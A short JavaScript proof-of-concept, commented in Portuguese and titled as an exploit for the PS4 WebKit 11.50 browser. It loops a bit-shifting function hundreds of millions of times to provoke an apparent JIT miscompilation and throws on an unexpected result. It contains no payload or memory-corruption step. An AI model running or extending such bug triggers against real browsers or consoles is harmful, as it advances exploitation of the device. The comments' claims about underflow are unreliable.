// exploit.js - Versão ajustada para PS4 (WebKit 11.50)
function foo(a, b, c) { 
    // Força underflow/overflow com valores mais extremos
    let x = a | 0;
    let y = b | -5;  // Underflow potencial no 'lsb' (SBFX)
    let z = c & 0x7FFFFFFF;  // Overflow potencial (limite de 32 bits)
    
    // Operações mais agressivas
    z = (x << y) ^ (x << (y & 0x10ff)); 
    let r = z ^ 0xF01;
    let s = z ^ 0xF1F;
    
    // Cálculo final com mais manipulação de bits
    let result = (((a >>> r) << s) >> s);
    
    // Adiciona estresse extra (opcional)
    for (let i = 0; i < 5; i++) {
        result = (result << 1) | (result >> 31); // ROL 1
    }
    return result;
}

// Configurações para PS4 (ajuste conforme necessário)
const LEN = 500000000;  // 500 milhões de iterações
let res = foo((100 & 127), -5, 0x7FFFFFFF);  // Teste inicial com valores críticos

// Verificação rápida
if (res !== -1 && res !== 0) {
    throw `Resultado anômalo (1): ${res.toString(16)}`;
}

// Loop principal (pode travar o navegador)
console.log("Iniciando teste...");
for (let i = 0; i <= LEN; i++) {
    res = foo((i & 127), -5 + (i % 10), 0x7FFFFFFF - (i % 100));
    
    // Verifica a cada 1 milhão de iterações
    if (i % 1000000 === 0) {
        console.log(`Progresso: ${i}/${LEN}`);
    }
    
    // Se houver resultado inesperado, interrompe
    if (res !== -1 && res !== 0) {
        throw `Resultado anômalo (2): ${res.toString(16)}`;
    }
}

console.log("✅ Teste concluído (sem erros detectados)");
